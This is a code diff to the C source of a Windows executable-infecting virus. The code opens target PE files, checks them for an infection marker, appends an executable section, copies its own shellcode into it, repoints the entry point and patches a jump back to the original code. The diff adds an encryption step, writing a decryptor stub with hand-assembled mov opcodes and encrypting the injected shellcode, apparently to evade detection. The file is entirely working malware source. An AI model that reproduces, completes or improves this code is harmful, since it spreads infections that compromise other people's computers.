@@ -1,6 +1,7 @@
 #include <Windows.h>
 
 #include "R.h"
+#include "ciphers.h"
 #include "peb-lookup.h"
 #include "prototype.h"
 
@@ -26,8 +27,7 @@ PIMAGE_SECTION_HEADER getShellcodeSection(LPVOID baseAddress) {
 
     PIMAGE_SECTION_HEADER textSection = NULL;
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
-        PIMAGE_SECTION_HEADER currentSection =
-            (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
+        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
         DWORD64 name = *(PDWORD64)currentSection->Name;
         // .rsrc
         if (name == 0x637373722e) {
@@ -42,8 +42,8 @@ PIMAGE_SECTION_HEADER getShellcodeSection(LPVOID baseAddress) {
     return textSection;
 }
 
-int getFileAlignment(protoCreateFileMappingA _CreateFileMappingA, protoMapViewOfFile _MapViewOfFile,
-                     protoUnmapViewOfFile _UnmapViewOfFile, protoCloseHandle _CloseHandle, HANDLE file) {
+int getFileAlignment(protoCreateFileMappingA _CreateFileMappingA, protoMapViewOfFile _MapViewOfFile, protoUnmapViewOfFile _UnmapViewOfFile,
+                     protoCloseHandle _CloseHandle, HANDLE file) {
     HANDLE fileMapping = _CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
     LPVOID baseAddress = _MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
 
@@ -62,14 +62,12 @@ BOOL isInfected(HANDLE kernel32, protoGetProcAddress _GetProcAddress, LPCSTR fil
 #pragma GCC diagnostic ignored "-Wcast-function-type"
     protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
     protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
-    protoCreateFileMappingA _CreateFileMappingA =
-        (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
+    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
     protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
     protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
 #pragma GCC diagnostic pop
 
-    HANDLE file =
-        _CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE file = _CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (file == INVALID_HANDLE_VALUE) {
         return FALSE;
     }
@@ -81,8 +79,8 @@ BOOL isInfected(HANDLE kernel32, protoGetProcAddress _GetProcAddress, LPCSTR fil
     BOOL result = TRUE;
     if (shellcode) {
         // .rssc
-        result = *(PDWORD64)shellcode->Name == 0x637373722e ||
-                 *(PDWORD)((ULONG_PTR)baseAddress + shellcode->PointerToRawData + jmpOffset) == 0xdeadbeef;
+        result =
+            *(PDWORD64)shellcode->Name == 0x637373722e || *(PDWORD)((ULONG_PTR)baseAddress + shellcode->PointerToRawData + jmpOffset) == 0xdeadbeef;
     }
 
     _UnmapViewOfFile(baseAddress);
@@ -98,8 +96,7 @@ ULONG_PTR RVA2RA(LPVOID baseAddress, int RVA) {
     LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);
 
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
-        PIMAGE_SECTION_HEADER currentSection =
-            (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
+        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
 
         int VA = currentSection->VirtualAddress;
         int VS = currentSection->Misc.VirtualSize;
@@ -115,18 +112,15 @@ BOOL tlsInject(LPVOID baseAddress, ULONG_PTR callbackAddress) {
     PIMAGE_DOS_HEADER dosHeader = baseAddress;
     PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;
 
-    PIMAGE_DATA_DIRECTORY dataDirectoryTLS =
-        (PIMAGE_DATA_DIRECTORY)(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
+    PIMAGE_DATA_DIRECTORY dataDirectoryTLS = (PIMAGE_DATA_DIRECTORY)(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
     if (!dataDirectoryTLS->VirtualAddress) {
         return FALSE;
     }
 
     PIMAGE_TLS_DIRECTORY tlsDirectory = (PIMAGE_TLS_DIRECTORY)RVA2RA(baseAddress, dataDirectoryTLS->VirtualAddress);
-    PDWORD64 firstCallbackAddress =
-        (PDWORD64)RVA2RA(baseAddress, tlsDirectory->AddressOfCallBacks - ntHeaders->OptionalHeader.ImageBase);
+    PDWORD64 firstCallbackAddress = (PDWORD64)RVA2RA(baseAddress, tlsDirectory->AddressOfCallBacks - ntHeaders->OptionalHeader.ImageBase);
 
-    while (*firstCallbackAddress)
-        ++firstCallbackAddress;
+    while (*firstCallbackAddress) ++firstCallbackAddress;
 
     *firstCallbackAddress = callbackAddress;
     *(firstCallbackAddress + 1) = 0;
@@ -145,19 +139,16 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
 
     protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
     protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
-    protoCreateFileMappingA _CreateFileMappingA =
-        (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
+    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
     protoGetFileSize _GetFileSize = (protoGetFileSize)_GetProcAddress(kernel32, aGetFileSize);
-    protoGetModuleFileNameA _GetModuleFileNameA =
-        (protoGetModuleFileNameA)_GetProcAddress(kernel32, aGetModuleFileNameA);
+    protoGetModuleFileNameA _GetModuleFileNameA = (protoGetModuleFileNameA)_GetProcAddress(kernel32, aGetModuleFileNameA);
     protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
     protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
 #pragma GCC diagnostic pop
 
     char baseFileName[MAX_PATH];
     _GetModuleFileNameA(NULL, baseFileName, MAX_PATH);
-    HANDLE base =
-        _CreateFileA(baseFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE base = _CreateFileA(baseFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (base == INVALID_HANDLE_VALUE) {
         return 1;
     }
@@ -171,16 +162,16 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     // NOTE: Change to original shellcode size, otherwise it will grown up over time
     int shellcodeSize = shellcode->SizeOfRawData;
 
-    HANDLE target = _CreateFileA(fileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
-                                 FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE target = _CreateFileA(fileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (target == INVALID_HANDLE_VALUE) {
         return 2;
     }
 
     // Create new space for the shellcode
     int fileAlignment = getFileAlignment(_CreateFileMappingA, _MapViewOfFile, _UnmapViewOfFile, _CloseHandle, target);
-    HANDLE targetMapping = _CreateFileMappingA(
-        target, NULL, PAGE_READWRITE, 0, MEM_ALIGN(_GetFileSize(target, NULL) + shellcodeSize, fileAlignment), NULL);
+    HANDLE targetMapping =
+        _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
+                            MEM_ALIGN(_GetFileSize(target, NULL) + shellcodeSize + cipher1Size + passing_params_opcode_size, fileAlignment), NULL);
     LPVOID targetAddress = _MapViewOfFile(targetMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 
     PIMAGE_DOS_HEADER dosHeader = targetAddress;
@@ -189,8 +180,7 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     // Create new section
     LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);
     PIMAGE_SECTION_HEADER newSection =
-        (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader +
-                                ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
+        (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
     PIMAGE_SECTION_HEADER lastSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)newSection - sizeof(IMAGE_SECTION_HEADER));
 
     ++ntHeaders->FileHeader.NumberOfSections;
@@ -207,27 +197,43 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     ntHeaders->OptionalHeader.SizeOfImage += newSection->Misc.VirtualSize;
 
     newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
-    newSection->VirtualAddress =
-        MEM_ALIGN(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, sectionAlignment);
+    newSection->VirtualAddress = MEM_ALIGN(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, sectionAlignment);
 
     newSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
 
-    // Copy shellcode to target
-    LPVOID dest = (LPVOID)((ULONG_PTR)targetAddress + newSection->PointerToRawData);
+    LPVOID decryptorLocation = (LPVOID)((ULONG_PTR)targetAddress + newSection->PointerToRawData);
+
+    // Passing params to decryptor
+    *(PDWORD)((ULONG_PTR)decryptorLocation) = 0xb948;  // mov rcx
+    *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) = cipher1Size;
+
+    *(PDWORD)((ULONG_PTR)decryptorLocation + 10) = 0xba48;  // mov rdx
+    *(PDWORD64)((ULONG_PTR)decryptorLocation + 12) = shellcodeSize;
+
+    *(PDWORD)((ULONG_PTR)decryptorLocation + 20) = 0xb849;  // mov r8
+    *(PDWORD64)((ULONG_PTR)decryptorLocation + 22) = (ULONG_PTR)decryptorLocation;
+
+    // Copy decryptor
+    _RtlCopyMemory((LPVOID)((ULONG_PTR)decryptorLocation + passing_params_opcode_size), cipher1, cipher1Size);
+
+    // Copy shellcode
+    LPVOID shellcodeLocation = decryptorLocation + passing_params_opcode_size + cipher1Size;
     LPVOID source = (LPVOID)((ULONG_PTR)baseAddress + shellcode->PointerToRawData);
-    _RtlCopyMemory(dest, source, shellcodeSize);
+    _RtlCopyMemory(shellcodeLocation, source, shellcodeSize);
 
     // patch jump relative
-    *(PDWORD)(dest + jmpOffset) =
-        ntHeaders->OptionalHeader.AddressOfEntryPoint - (newSection->VirtualAddress + jmpOffset + 4);
+    *(PDWORD)(shellcodeLocation + jmpOffset) = ntHeaders->OptionalHeader.AddressOfEntryPoint - (newSection->VirtualAddress + jmpOffset + 4);
 
-    if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
-        // patch jmp to ret
-        // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
-    } else {
-        // Change OEP to shellcode
-        ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
-    }
+    // encrypt shellcode
+    cipher(shellcodeLocation, shellcodeSize, (ULONG_PTR)decryptorLocation);
+
+    // if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
+    // patch jmp to ret
+    // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
+    // } else {
+    // Change OEP to shellcode
+    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
+    // }
 
     _UnmapViewOfFile(targetAddress);
     _CloseHandle(targetMapping);
